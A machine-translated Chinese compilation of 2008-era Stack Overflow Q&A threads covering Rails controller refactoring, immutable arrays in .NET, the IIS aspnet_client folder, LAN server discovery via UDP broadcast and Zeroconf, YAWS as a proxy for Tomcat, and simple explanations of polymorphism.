给他们看！让他们在“但这会更容易”中做一个小模块。风格，而你以正确的方式去做。然后要求他们对需求进行 2 到 5 次更改（必须是他们进行更改），并就实施更改进行定时竞赛。这可能需要一两天，但他们会得到它。如果您不这样做，您将对每个新项目或任务进行相同的讨论。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-10-16T22:48:24.583

您可以尝试对它们进行类比....

国际象棋的规则很简单。你可以教孩子：“马像这样移动”、“城堡像这样移动”等。

如果这就是你所知道的，你可以下一些棋并且可能会玩得很开心，但是对游戏有更深入了解的人每次都会和你一起擦棋盘。你会被打败，甚至不再有趣，因为你不知道他们是怎么做到的。

同样的原则也适用于编程。了解语言的语法和一些简单的数据结构就足以让您获得一个工作程序，但是对于必须在多个发布周期中存活的大型应用程序，您不会有太多的运气。

国际象棋有开局、进攻策略等。我们有设计模式。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2008-10-16T22:18:26.767

问题是除了最基本的概念和拖放式开发之外，大多数人甚至不了解软件设计。对于每一个研究和教育自己所有最好的新概念和技术的开发人员，有十个回家不看电脑。你必须教他们。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2008-10-17T04:24:18.853

大约五年前，我设计了一个庞大而复杂的系统。在接下来的五年里，我将自己注入到每个影响“我的”系统的项目中，以防止野蛮人玷污我的建筑。只要我施加持续、无情的压力，我就能保持架构相当干净，但我正在打一场失败的战斗。原因如下：

*1) 大多数人的评判标准是他们今天*是否完成了工作。从来没有人因为三年前为了按时完成一个项目而偷工减料（或两年）而受到谴责。另一方面，许多人因*没有*按时完成项目而受到谴责。

2）您可能希望保持系统整洁，因为您对代码、应用程序或用户等有一种主人翁意识。很多人没有主人翁意识，因此很乐意破解一些东西所以他们可以完成它。你可以把马牵到水边，但你不能让他在意。

3）如果你*说服*每个人正确地维护代码，新人就会加入进来，需要被教导如何正确地做事。所以即使你成功了，你也会觉得自己失败了，因为你总是在与新对手进行同样的战斗。

4）你可能真的错了。微软花费两倍的程序员时间使 MS-Paint 健壮和可维护是否具有经济意义？有时，一个丑陋的黑客系统已经足够好了。大多数优秀的程序员很难理解这一点，但这通常是因为他们是优秀的程序员。

5) 我发誓有些人喜欢把东西拼凑在一起，或者因为他们可以更快地完成，或者他们将是唯一理解它的人，或者他们有打破规则的幼稚需要。你不能和这些人讲道理，你和他们争论的时间越多，项目截止日期就越近，这将迫使你无论如何都要一起破解一些东西。

6) 你很有可能比他们更了解这个系统。对你来说看起来像一个丑陋的 hack，对于一个不熟悉系统的人来说可能看起来像是“轻描淡写”。或者使代码健壮的额外努力将保护程序员免受他以前从未遇到过的问题，因此无法理解。在出现问题之前，您不会学习检查返回码，因为您*没有*检查返回码。那时，它不再是“额外的工作”，而是开始成为“必需的工作”。

如果你有一个小而紧密的开发团队，这是可能的。但组织越大，你成功的可能性就越小。如果你设法让一个拥有 250 人的 IT 商店重视做事正确而不是快速做事，那么你的说服力就是传奇。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-10-16T23:47:31.267

[http://catb.org/jargon/html/L/LART.html](http://catb.org/jargon/html/L/LART.html) SCNR 等 pp ;)

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-10-17T15:50:09.873

告诉他们阅读（他们永远不会）封装理论： [http ://www.edmundkirwan.com/](http://www.edmundkirwan.com/)

# mysql - 如何保持 ActiveRecord 关联 DRY？

> ID：210423
> 
> 赞同：5
> 
> 时间：2008-10-16T21:45:56.723
> 
> 标签：mysql, activerecord, dry

我在尝试让 AR 查找器在我的应用程序中保持干燥时遇到问题。我创建了一个博客应用程序，当用户第一次查看它时，它会获取博客的所有相关页面、帖子、链接、标签和类别。博客控制器的示例显示操作如下所示：

```
def show
    #find blog by user name
    @user= User.find_by_login(params[:id])
    @blog= @user.blog
    @posts = Post.status("publish",@user).find(:all, :order => "created_at DESC")
    @tags = @user.tags
    @pages = Page.status("publish",@user).find(:all, :order => "created_at DESC")
    @links = @user.links.public_link.find(:all, :order => 'created_at DESC')
    @archives = @posts.group_by(&:month)
    @categories = @user.categories.group_by(&:name)
    session[:found_user]=@user.login
    render :layout=>false
  end 
```

正如您所看到的，它不是很干燥，因为在控制器中还有其他操作会调用相同的实例变量，例如 @tags 等。

我怎样才能使这个更干燥？我尝试将它移动到博客模型中，但我仍然需要在控制器中调用各种实例变量，例如 @tags 等。

有没有办法在第一次调用博客时存储所有这些变量并在控制器和操作中重用它们？

谢谢你的任何建议。我正在使用 Rails 2.1

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-16T22:55:04.290

我在某处的博客上阅读，只是用辅助方法替换过滤器（或在控制器方法中加载各种数据）。像这样的东西：

```
class BlogsController < ApplicationController
  def show
    session[:found_user]=@user.login
    render :layout=>false
  end

  helper_method :user, :blog, :posts, :tags, :pages, :links, :archives, :categories

  protected
  def user
    @user ||= User.find_by_login(params[:id])
  end

  def blog
    @blog ||= user.blog
  end

  def posts
    @posts ||= Post.status("publish", user).find(:all, :order => "created_at DESC")
  end

  def tags
    @tags ||= user.tags
  end

  def pages
    @pages ||= Page.status("publish", user).find(:all, :order => "created_at DESC")
  end

  def links
    @links ||= user.links.public_link.find(:all, :order => 'created_at DESC')
  end

  def archives
    @archives ||= posts.group_by(&:month)
  end

  def categories
    @categories ||= user.categories.group_by(&:name)
  end
end

## app/views/blogs/show.html.erb
<p>Name: <%=h user.name %></p>
<h3><%= posts.length %> Posts</h3>
<% posts.each do |post| %>
  ...
<% end %>
<ul>
  <% categories.each do |category| %>
    <li><%=h category %></li>
  <% end %>
</ul> 
```

看看如何在视图中使用任何东西来简单地调用数据库。此解决方案的一个优点是未调用的辅助方法不会从操作中花费时间。

如有必要，将辅助方法抽象为一个模块，并将该模块包含在 ApplicationController 中。

# c# - .NET 中是否可以使用不可变数组？

> ID：210428
> 
> 赞同：30
> 
> 时间：2008-10-16T21:49:16.340
> 
> 标签：c#, .net, arrays, immutability

是否有可能以某种方式将 a 标记`System.Array`为不可变。当放在 public-get/private-set 后面时，它们不能被添加，因为它需要重新分配和重新分配，但消费者仍然可以设置他们希望的任何下标：

```
public class Immy
{
    public string[] { get; private set; }
} 
```

我认为`readonly`关键字可能会起作用，但没有这样的运气。

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2008-10-16T22:11:56.153

[框架设计指南](https://rads.stackoverflow.com/amzn/click/com/0321246756)建议返回 Array的副本。这样，消费者就无法更改数组中的项目。

```
// bad code
// could still do Path.InvalidPathChars[0] = 'A';
public sealed class Path {
   public static readonly char[] InvalidPathChars = 
      { '\"', '<', '>', '|' };
} 
```

这些更好：

```
public static ReadOnlyCollection<char> GetInvalidPathChars(){
   return Array.AsReadOnly(InvalidPathChars);
}

public static char[] GetInvalidPathChars(){
   return (char[])InvalidPathChars.Clone();
} 
```

这些例子直接来自书中。

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2008-10-16T21:53:32.290

[`ReadOnlyCollection<T>`](http://msdn.microsoft.com/en-us/library/ms132474)可能是您正在寻找的。它没有`Add()`方法。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2013-01-02T19:35:04.583

请参阅基类库中**[现在可用的不可变集合（当前处于预览状态）。](http://blogs.msdn.com/b/bclteam/archive/2012/12/18/preview-of-immutable-collections-released-on-nuget.aspx)**

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2008-10-16T21:57:03.907

您可以使用 Array.AsReadOnly 方法返回。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-16T21:52:33.917

出于这个确切原因，我相信最佳实践是在公共 API 中使用 IList<T> 而不是数组。**readonly**将阻止在构造函数之外设置成员变量，但正如您所发现的，不会阻止人们在数组中分配元素。

有关更多信息，请参阅[被认为有些有害的数组。](http://blogs.msdn.com/ericlippert/archive/2008/09/22/arrays-considered-somewhat-harmful.aspx)

**编辑：**数组不能是只读的，但可以通过 Array.AsReadOnly() 将它们转换为只读的 IList 实现，正如@shahkalpesh 指出的那样。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-07-25T08:15:39.447

除了最简单和最传统的用例之外，.NET 倾向于避开数组。对于其他一切，有各种可枚举/集合实现。

当您想将一组数据标记为不可变时，您将超越传统数组提供的功能。.NET 提供了等效的功能，但在技术上不是以数组的形式。要从数组中获取不可变集合，请使用[`Array.AsReadOnly<T>`](http://msdn.microsoft.com/en-us/library/53kysx7b.aspx "MSDN：Array.AsReadOnly<T>")：

```
var mutable = new[]
{
    'a', 'A',
    'b', 'B',
    'c', 'C',
};

var immutable = Array.AsReadOnly(mutable); 
```

`immutable`将是一个[`ReadOnlyCollection<char>`](http://msdn.microsoft.com/en-us/library/ms132474.aspx "MSDN：System.Collections.ObjectModel.ReadOnlyCollection<T>")实例。作为更一般的用例，您可以[`ReadOnlyCollection<T>`](http://msdn.microsoft.com/en-us/library/ms132474.aspx "MSDN：System.Collections.ObjectModel.ReadOnlyCollection<T>")从任何通用[`IList<T>`](http://msdn.microsoft.com/en-us/library/5y536ey6.aspx "MSDN：System.Collections.Generic.IList<T>")实现创建一个。

```
var immutable = new ReadOnlyCollection<char>(new List<char>(mutable)); 
```

请注意，它必须是通用实现；plain old[`IList`](http://msdn.microsoft.com/en-us/library/system.collections.ilist.aspx "MSDN：System.Collections.IList")不起作用，这意味着您不能在传统数组上使用此方法，该数组仅实现[`IList`](http://msdn.microsoft.com/en-us/library/system.collections.ilist.aspx "MSDN：System.Collections.IList"). 这揭示了将其[`Array.AsReadOnly<T>`](http://msdn.microsoft.com/en-us/library/53kysx7b.aspx "MSDN：Array.AsReadOnly<T>")用作获得对通常无法通过传统数组访问的通用实现的访问的快速方法的可能性。

[`ReadOnlyCollection<T>`](http://msdn.microsoft.com/en-us/library/ms132474.aspx "MSDN：System.Collections.ObjectModel.ReadOnlyCollection<T>")将使您可以访问不可变数组所期望的所有功能：

```
// Note that .NET favors Count over Length; all but traditional arrays use Count:
for (var i = 0; i < immutable.Count; i++)
{
    // this[] { get } is present, as ReadOnlyCollection<T> implements IList<T>:
    var element = immutable[i]; // Works

    // this[] { set } has to be present, as it is required by IList<T>, but it
    // will throw a NotSupportedException:
    immutable[i] = element; // Exception!
}

// ReadOnlyCollection<T> implements IEnumerable<T>, of course:
foreach (var character in immutable)
{
}

// LINQ works fine; idem
var lowercase =
    from c in immutable
    where c >= 'a' && c <= 'z'
    select c;

// You can always evaluate IEnumerable<T> implementations to arrays with LINQ:
var mutableCopy = immutable.ToArray();
// mutableCopy is: new[] { 'a', 'A', 'b', 'B', 'c', 'C' }
var lowercaseArray = lowercase.ToArray();
// lowercaseArray is: new[] { 'a', 'b', 'c' } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-16T23:26:58.547

唯一要补充的是数组*意味着*可变性。当你从一个函数返回一个数组时，你是在向客户端程序员建议他们可以/应该改变一些事情。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-17T11:49:24.227

除了马特的回答，IList 是一个完整的数组抽象接口，因此它允许添加、删除等。我不确定为什么 Lippert 似乎建议它作为需要不变性的 IEnumerable 的替代方案。（**编辑：**因为 IList 实现可以为那些变异方法抛出异常，如果你喜欢那种东西）。

也许另一件事要记住，列表中的项目也可能具有可变状态。如果你真的不希望调用者修改这种状态，你有一些选择：

确保列表中的项目是不可变的（如您的示例中：字符串是不可变的）。

返回所有内容的深层克隆，因此在这种情况下，您无论如何都可以使用数组。

返回一个提供对项目的只读访问权限的接口：

```
interface IImmutable
{
    public string ValuableCustomerData { get; }
}

class Mutable, IImmutable
{
    public string ValuableCustomerData { get; set; }
}

public class Immy
{
    private List<Mutable> _mutableList = new List<Mutable>();

    public IEnumerable<IImmutable> ImmutableItems
    {
        get { return _mutableList.Cast<IMutable>(); }
    }
} 
```

请注意，可从 IImmutable 接口访问的每个值本身必须是不可变的（例如字符串），或者是您即时创建的副本。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-17T15:34:38.063

您希望做的最好的事情就是扩展现有的集合来构建您自己的集合。最大的问题是它的工作方式必须与每个现有集合类型不同，因为每次调用都必须返回一个新集合。

# iis - IIS 结构下的 aspnet_client 文件夹是什么？

> ID：210440
> 
> 赞同：120
> 
> 时间：2008-10-16T21:52:27.037
> 
> 标签：iis

我注意到标准 IIS Web 文件夹结构下经常有一个 aspnet_client 文件夹。这是干什么用的？需要吗？

* * *

## 回答 #1

> 赞同：99
> 
> 时间：2008-10-16T21:56:54.827

在 .NET 1.1 和之前的版本中，此文件夹为 ASP.NET 提供了对验证控件和其他功能的 JavaScript 支持。如果您没有运行 .NET 1.1 或更早版本的站点，删除它应该是安全的。我会先重命名它以确保它不会引起任何问题。

* * *

## 回答 #2

> 赞同：68
> 
> 时间：2008-10-16T22:07:14.027

除了其他人所说的之外，它通常由 aspnet_regiis 工具创建，该工具可以由 Windows Update/AddRemove Windows components/IIS 之类的东西（重新）运行。因此，有时即使您确实删除了它，它也可能会随机返回。可能有一种方法可以阻止这种行为，但我还没有找到它（也许将应用程序版本更改为 .NET 2 实际上会这样做）。

因此，除非您使用 .NET 1.0/1.1 的某些功能（验证、智能导航等），否则您可以毫无问题地删除它，如果它再次出现请不要太惊讶！

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2014-02-10T01:54:37.197

aspnet_client 是一个文件夹，用于存放“必须通过 HTTP 提供服务，但基于每个服务器而不是每个应用程序安装的资源”。

aspnet_client 的一些用途包括为以下目的存储资源（例如 JavaScript、图像）：

*   使用客户端验证时用于 ASP.NET Web 窗体控件的 JavaScript（似乎主要用于处理 IE5 等较旧的浏览器）
*   用于“全局主题”的 ASP.NET 2.0（直到框架 4.0）（即，对服务器上的所有站点都是全局的）
*   水晶报表的某些版本

将来可能/将进一步（ab）使用此文件夹。不用说，由于它包含“应用程序正确运行所必需的”但“不应该由应用程序部署”的东西，因此对于开发人员和系统管理员来说，这将是一场噩梦。

似乎文件夹内容的“原型”位于 C:\inetpub\wwwroot 中，并且假设任何给定的 IIS 网站缺少 /aspnet_client 资源似乎是合理的，那么 IIS 将尝试做正确的事情并且...作为最后的手段...在网站根文件夹中创建一个物理文件夹，并将文件复制到那里。似乎 IIS 至少会在给定服务器调用“ASPNET_regiis /c”时执行此操作 - 这可能会在某些关键时刻自动发生……例如当 .NET 框架更新应用于具有 IIS 角色的服务器时。

处理 aspnet_client 目录的策略包括：

*   指定映射到 C:\inetpub\wwwroot 的虚拟目录，希望 IIS 放弃创建物理目录
*   如果您确定您的站点不需要它，不时删除物理目录并且它真的很困扰您
*   忽略 aspnet_client
*   如果您缺少该文件夹并需要它，请自行运行“ASPNET_regiis /c”

可能最重要的是，作为开发人员，您应该清楚地了解并记录应用程序对 aspnet_client 目录的依赖关系，并确保您的安装过程有相关说明以确保该目录存在。但是，您可能不必费心将目录作为打包的 Web 应用程序或网站的一部分实际*提供- 您怎么可能为服务器在应用程序生命周期内看到的每个版本的 .NET 框架执行此操作？！*

我稍后会回到一些链接：

*   [http://my.safaribooksonline.com/book/certification/mcts/9780735657489/2dot-using-master-pages-themes-and-caching/ch02s03_html?query=((aspnet_client))&reader=html&imagepage=#snippet](http://my.safaribooksonline.com/book/certification/mcts/9780735657489/2dot-using-master-pages-themes-and-caching/ch02s03_html?query=((aspnet_client))&reader=html&imagepage=#snippet)
*   [我的 ASP.NET 网站中的 aspnet_client 文件夹是什么？](https://stackoverflow.com/questions/947047/what-is-the-aspnet-client-folder-in-my-asp-net-website)
*   [全局主题目录的 iis 快速路径](https://stackoverflow.com/questions/5444720/iis-express-path-for-global-theme-directory) [http://my.safaribooksonline.com/book/web-development/microsoft-aspdotnet/0735621772/aspdotnet-configuration/111?query=((aspnet_client))#X2ludGVybmFsX0J2ZGVwRmxhc2hSZWFkZXI/eG1saWQ9MDczNTYyMTc3Mi8xMTE=](http://my.safaribooksonline.com/book/web-development/microsoft-aspdotnet/0735621772/aspdotnet-configuration/111?query=((aspnet_client))#X2ludGVybmFsX0J2ZGVwRmxhc2hSZWFkZXI/eG1saWQ9MDczNTYyMTc3Mi8xMTE=)
*   [http://my.safaribooksonline.com/book/web-development/microsoft-aspdotnet/9780471785989/working-with-themes/ch41lev1sec8?query=((aspnet_client))&reader=html&imagepage=#X2ludGVybmFsX0h0bWxWaWV3P3htbGlkPTk3ODA0NzE3ODU5ODklMkZjaDQxbGV2MnNlYzEwJnF1ZXJ5PSgoYXNwbmV0X2NsaWVudCkp](http://my.safaribooksonline.com/book/web-development/microsoft-aspdotnet/9780471785989/working-with-themes/ch41lev1sec8?query=((aspnet_client))&reader=html&imagepage=#X2ludGVybmFsX0h0bWxWaWV3P3htbGlkPTk3ODA0NzE3ODU5ODklMkZjaDQxbGV2MnNlYzEwJnF1ZXJ5PSgoYXNwbmV0X2NsaWVudCkp)
*   [http://my.safaribooksonline.com/book/web-development/microsoft-aspdotnet/067232542x/performing-form-validation-with-validation-controls/ch03lev1sec1?query=((aspnet_client))&reader=html&imagepage=#snippet](http://my.safaribooksonline.com/book/web-development/microsoft-aspdotnet/067232542x/performing-form-validation-with-validation-controls/ch03lev1sec1?query=((aspnet_client))&reader=html&imagepage=#snippet)
*   [http://scn.sap.com/thread/3157366](http://scn.sap.com/thread/3157366)

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2008-11-07T09:22:13.567

它还具有水晶报表所需的某些图标和脚本，即使在 1.1 之后的版本中也能正常运行

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-16T21:59:40.220

该文件夹通常用于存储客户端 Javascript，ASP.NET 将其用于验证之类的事情。

删除应该是安全的。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-05-22T16:37:19.090

Figured I'd add this here as this is the link I kept being directed to when I googled this question. Apparently with .NET 4.0 and newer this folder is no longer needed and can be removed without issue.

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-02-23T09:57:24.770

If you are using Installshield to configure ASP.net website, be aware that this feature was present in Installshield 2010 and is missing in Installshield 2012. [![Installshield 2010 Vs 2012](https://i.stack.imgur.com/AfhJk.png)](https://i.stack.imgur.com/AfhJk.png)

# c# - 客户端应用程序在 C# 中查找本地网络上的服务器的最佳方法是什么？

> ID：210446
> 
> 赞同：13
> 
> 时间：2008-10-16T21:55:49.417
> 
> 标签：c#, remoting, client-server, service-discovery

客户端使用 GenuineChannels 连接到服务器（我们正在考虑切换到 DotNetRemoting）。我所说的查找是获取要连接的服务器的 IP 和端口号。

似乎蛮力的方法是尝试网络上的每个 IP 尝试活动端口（甚至不确定这是否可能），但必须有更好的方法。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-10-16T22:02:13.070

考虑广播一个特定的 UDP 数据包。当服务器或服务器看到广播的 UDP 数据包时，它们会发送回复。客户端可以从所有服务器收集回复并开始连接它们或基于选举算法。

请参阅客户端示例（**未经测试的代码**）：

* * *

```
using System.Net;
using System.Net.Sockets;

[STAThread]
static void Main(string[] args)
{
    Socket socket = new Socket(AddressFamily.InterNetwork,
    SocketType.Dgram, ProtocolType.Udp);
    socket.Bind(new IPEndPoint(IPAddress.Any, 8002));
    socket.Connect(new IPEndPoint(IPAddress.Broadcast, 8001));
    socket.Send(System.Text.ASCIIEncoding.ASCII.GetBytes("hello"));

    int availableBytes = socket.Available;
    if (availableBytes > 0)
    {
        byte[] buffer = new byte[availableBytes];
        socket.Receive(buffer, 0, availableBytes, SocketFlags.None);
        // buffer has the information on how to connect to the server
    }
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-10-16T22:27:14.423

我想说最好的方法是在 C# 中使用 Bonjour/Zeroconf/mDNS；为了让它与网络融为一体，我们花了很多心思；IE 如果可能的话，随着时间的推移，它的 ping 频率会降低，等等。有[Mono.Zeroconf](http://mono-project.com/Mono%2eZeroconf)，我读到[Apple SDK](http://developer.apple.com/networking/bonjour/download/)中有一个较旧的 .NET 项目，但我没有找到它。

所以最简单的方法是[为 Windows 安装 Bonjour](http://developer.apple.com/networking/bonjour/download/)，然后[为 Mono.Zeroconf 获取 Windows 二进制文件，](http://download.banshee-project.org/mono-zeroconf/mono-zeroconf-0.8.0-binary.zip)尝试示例`MZClient.exe`将`Mono.Zeroconf.dll`和/或`Mono.Zeroconf.Providers.Bonjour.dll`放入您的项目引用中并继续。

像这样的东西：

```
var service = new Mono.Zeroconf.RegisterService {
                Name = "Use Me for Stuff",
                RegType = "_daap._tcp",
                ReplyDomain = "local.",
                Port = 0024200,
                TxtRecord = new Mono.Zeroconf.TxtRecord {
                            {"I have no idea what's going on", "true"}}
              };
service.Register();

var browser = new Mono.Zeroconf.ServiceBrowser();
browser.ServiceAdded +=
    delegate(object o, Mono.Zeroconf.ServiceBrowseEventArgs args) {
        Console.WriteLine("Found Service: {0}", args.Service.Name);
        args.Service.Resolved +=
            delegate(object o, Mono.Zeroconf.ServiceBrowseEventArgs args) {
                var s = args.Service;
                Console.WriteLine(
                    "Resolved Service: {0} - {1}:{2} ({3} TXT record entries)",
                    s.FullName, s.HostEntry.AddressList[0], s.Port, s.TxtRecord.Count);
          };
        args.Service.Resolve();
    };
browser.Browse("_daap._tcp", "local"); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-09-19T13:34:48.520

只是想指出一个替代 Zeroconf NuGet 包：[Zeroconf](http://www.nuget.org/packages/Zeroconf/)。它没有任何本机依赖项，​​因此您无需安装 Bonjour for Windows 或其他任何东西。

它支持 .NET 4.5、WP8 和 Win8。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2011-03-03T11:09:38.847

WS-Discovery 是用于此目的的协议。它有一些不同的变体、不同风格的广播和代理。[http://en.wikipedia.org/wiki/WS-Discovery](http://en.wikipedia.org/wiki/WS-Discovery)

.NET WCF4 实现了这一点。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-16T22:01:33.773

让服务器在网络上的特定端口上侦听广播（必须使用 UDP），当客户端启动时，它会在该端口上广播一些“ping”请求。当服务器看到“ping”时，它会发回一条消息，其中包含客户端连接到它所需的 TCP 地址和端口。

# java - YAWS 面向 Tomcat

> ID：210454
> 
> 赞同：1
> 
> 时间：2008-10-16T21:58:20.457
> 
> 标签：java, apache, tomcat, erlang, yaws

目前是否有任何简单的方法可以在 Apache Tomcat Servlet 容器前设置 YAWS Web 服务器，类似于流行的 Apache httpd + Tomcat 设置？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-17T10:29:02.907

我不相信 YAWS 有 AJP 连接器，但您应该能够通过 HTTP 将 Tomcat 与 YAWS 连接起来。YAWS 相对容易设置为反向代理。有关详细信息，请参阅此处的手册页（请参阅**revproxy**）：

[http://yaws.hyber.org/yman.yaws?page=yaws.conf](http://yaws.hyber.org/yman.yaws?page=yaws.conf)

**注意：**这尚未被视为生产质量，因此您需要进行大量测试以确保满足您的生产要求。

我不知道你的用例是什么，但你可能会发现[Nginx](http://nginx.net/)是 Apache 的一个有价值的替代品，作为 Tomcat 前面的负载平衡、HTTP 反向代理。网上有很多很好的教程，或者查看最近的 Linux Journal 文章（需要订阅）：

[http://www.linuxjournal.com/article/10108](http://www.linuxjournal.com/article/10108)

# c# - 获取应用程序名称/ID 的最佳实践

> ID：210455
> 
> 赞同：0
> 
> 时间：2008-10-16T21:58:50.580
> 
> 标签：c#, common-library

公共库了解它所在的上下文（即调用应用程序）的最佳方式是什么？我在一个非常受控的企业环境中......有没有比读取配置文件中的设置更好的方法让库知道从哪个应用程序调用它？你用什么来做这种事情？

`//the rest of the story`
我在一家财富 500 强制造公司的 Intranet 团队工作。我创建了一个公共库，我们所有的新 .Net 应用程序都将使用它。它查询公共数据库以获取有关应用程序的信息以及与问题无关的许多其他内容。可以想象，公共库需要知道调用它的应用程序。我可以强制每个应用程序在某个静态类或其他东西上设置一个属性，但我想让它在幕后更深入一点。目前，它要求开发人员在 app.config 或 web.config 中放置一个设置，其键为 ApplicationName，值为 - 你猜对了 - 应用程序名称（对我们来说，这是一个唯一不变的 id）。然后它使用当前它用来`ConfigurationManager.AppSettings["ApplicationName"]`将其拉入。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-16T22:04:52.597

可能有办法做到这一点。我很可能会对此投反对票，因为我根本不打算回答你的实际问题，但我不能不说什么就继续前进。对我来说，这是可能出现的最糟糕的耦合示例。您实际上必须查看数据库并根据调用它的应用程序表现出不同的行为？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-16T22:47:18.283

您也可以在公共库类中调用[Assembly.GetEntryAssembly 。](http://msdn.microsoft.com/en-us/library/system.reflection.assembly.getentryassembly.aspx)

然后使用返回程序集中的 .Name 属性。

这意味着那些，你的 appsettings 表（或任何它）需要由程序集名称作为键，并且如果程序集名称应该更改它会全部中断。这意味着您在此处的命名/键选择上的灵活性稍差。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-16T22:41:42.053

我在这里同意EBGreen。这对我来说是一个危险信号。

也就是说，我建议与您的建议完全相反，只需将密钥（应用程序名称或其他）作为参数传递给您正在调用的函数。您可以将它作为公共静态属性烘焙到程序中，无论您是入口点是什么，并制作一个小辅助函数，该函数基本上会重载对存储库的调用。这将隐藏它并减少容易出错的重复..

更好的是，您还可以让您的入口点类实现一个接口，该接口具有获取应用程序名称的方法（它只返回一个字符串常量）和用于设置从数据库返回的值的方法。称之为“IIntranetApp”之类的. 然后你只需将“this”传递给一个期待“IIntranetApp”的函数，它就会神奇地填补你的中央仓库所需的空白。

就像是：

```
public interface IIntranetApp
{
    string GetApplicationName();
    void SetConnectionString(string connectionString);
    // etc... add methods as necessary
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-16T22:14:53.823

getenv() 将为您提供环境变量，这反过来应该给您您想要的。但通常，根据调用程序的名称具有不同的行为*并不是*最佳实践。如果您想在日志消息中打印出调用程序的名称，则例外。当然还有其他的例外，你的情况可能就是其中之一。

您也可以通过进程 id (w/getpid()) 获取信息。

# language-agnostic - 尽可能简单地描述多态性

> ID：210460
> 
> 赞同：61
> 
> 时间：2008-10-16T22:00:09.050
> 
> 标签：language-agnostic, oop, polymorphism

如何以易于理解的方式描述多态性？

我们可以在 Internet 和书籍上找到很多关于该主题的信息，例如*[Type polymorphism](http://en.wikipedia.org/wiki/Type_polymorphism)*。但是，让我们尽量让它变得简单。

* * *

## 回答 #1

> 赞同：71
> 
> 时间：2008-10-16T22:17:45.673

两个对象以不同的行为响应相同的消息；发件人不必关心。

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2008-10-16T23:21:59.680

每个带有简单易拉盖的罐头都以相同的方式打开。
作为人类，您知道您可以找到任何类似的 Open()。

打开时，并非所有罐头的行为方式都相同。
有些含有坚果，有些含有冒出来的假蛇。
结果取决于罐的类型，如果罐是“CanOfNuts”或“CanOfSnakes”，但这与您如何打开它无关。你只知道你可以打开任何罐子，并且会得到某种结果，这取决于你打开的是什么类型的罐子。

pUnlabledCan->Open(); //可能给坚果，可能给蛇。我们不知道，直到我们称之为

Open() 具有“Contents”的通用返回类型（或者我们可能决定没有返回类型），因此 open 始终具有相同的函数签名。

你，人类，是用户/呼叫者。
Open() 是虚拟/多态函数。
“Can”是抽象基类。
CanOfNuts 和 CanOfSnakes 是“Can”类的多态子类。
每个 Can 都可以打开，但它具体*做*什么以及它返回的具体*内容*类型取决于它是什么类型的 can。
当您看到 pUnlabledCan 时，您只知道您可以 Open() 它，它会返回内容。任何其他行为（例如在你的脸上弹出蛇）都是由特定的 Can 决定的。

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2008-10-16T22:07:06.290

这是来自我对类似问题的回答[。](https://stackoverflow.com/questions/154577/polymorphism-vs-overriding-vs-overloading#154628)这是伪 C#/Java 中的多态性示例：

```
class Animal
{
    abstract string MakeNoise ();
}

class Cat : Animal {
    string MakeNoise () {
        return "Meow";
    }
}

class Dog : Animal {
    string MakeNoise () {
        return "Bark";
    }
}

Main () {
   Animal animal = Zoo.GetAnimal ();
   Console.WriteLine (animal.MakeNoise ());
} 
```

Main() 方法不知道动物的类型，它取决于 MakeNoise() 方法的特定实现行为。

* * *

## 回答 #4

> 赞同：20
> 
> 时间：2008-10-16T22:50:58.510

对多态性最简单的描述是**它是一种减少 if/switch 语句的方法**。

它还有一个好处是允许您在不修改现有类的情况下扩展您的 if/switch 语句（或其他人的语句）。

例如，考虑`Stream`.NET 中的类。如果没有多态性，它将是一个庞大的类，其中每个方法都实现一个 switch 语句，例如：

```
public class Stream
{
    public int Read(byte[] buffer, int offset, int count)
    {
        if (this.mode == "file")
        {
            // behave like a file stream
        }
        else if (this.mode == "network")
        {
            // behave like a network stream
        }
        else // etc.
    }
} 
```

相反，我们允许运行时以更有效的方式为我们进行切换，通过自动选择基于具体类型 ( `FileStream`, `NetworkStream`) 的实现，例如

```
public class FileStream : Stream
{
    public override int Read(byte[] buffer, int offset, int count)
    {
        // behave like a file stream
    }
}

public class NetworkStream : Stream
{
    public override int Read(byte[] buffer, int offset, int count)
    {
        // behave like a network stream
    }
} 
```

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2008-10-16T23:52:01.727

Poly: many
Morphism: 形式/形状

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2008-10-16T22:06:41.547

演员与角色（或角色）

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2008-12-20T21:34:51.767

苹果和橙子都是水果。水果可以吃。因此，苹果和橙子都可以吃。

踢球者？你吃的不一样！你剥橙子，但不剥苹果。

所以实现不同，但最终结果是一样的，*你吃水果*。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2008-10-16T22:44:15.560

如果它像鸭子一样走路，像鸭子一样嘎嘎叫，那么你可以在任何需要鸭子的地方把它当作鸭子对待。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2008-10-16T22:09:11.323

